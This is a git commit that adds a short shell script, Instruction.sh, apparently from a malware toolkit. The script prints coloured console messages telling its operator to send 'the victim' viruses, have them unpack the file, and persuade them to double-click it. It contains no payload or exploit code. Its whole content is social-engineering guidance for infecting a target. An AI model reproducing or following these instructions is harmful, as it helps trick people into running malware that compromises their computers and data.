171b80c2bdbecca98bc6de0ef1424952d17945c5
DeplayGo <68460974+mishakorzik@users.noreply.github.com>
2021-06-19 11:39:49 +0300

    Create Instruction.sh

---
+++ src/Instruction.sh
@@ -0,0 +1,12 @@
+g="\033[1;32m"
+r="\033[1;31m"
+b="\033[1;34m"
+w="\033[0m"
+o="\033[1;33m"
+
+echo -e $w"["$g"INFO"$w"]"$b"Drop the victim's viruses and tell him to unpack"$w
+sleep 0.4
+echo -e $w"["$g"INFO"$w"]"$b"And tell the victim to double-click on the file"$w
+sleep 1
+echo -e $w"["$o"WARN"$w"]"$b"Bye Bye! Have a nice day"$w
+
